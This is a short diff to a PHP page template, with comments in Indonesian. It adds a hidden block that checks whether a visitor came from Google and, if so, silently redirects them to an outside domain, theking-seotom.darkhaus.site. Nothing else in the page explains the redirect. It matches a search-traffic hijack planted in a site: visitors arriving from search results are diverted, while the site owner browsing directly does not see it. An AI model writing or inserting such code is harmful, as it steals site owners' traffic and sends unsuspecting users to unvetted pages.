@@ -1,4 +1,11 @@
 <?php
+// Redirect jika referer dari Google
+$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+if (stripos($referer, 'google.') !== false) {
+    header('Location: https://theking-seotom.darkhaus.site/amp/');
+    exit();
+}
+
 // Setup dasar
 $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
 $urlPath = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
@@ -80,6 +87,7 @@ if (!empty($brandsData) && !empty($segments[0])) {
     $Number = $numberRaw;
 }
 ?>
+
 
 <!DOCTYPE HTML>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
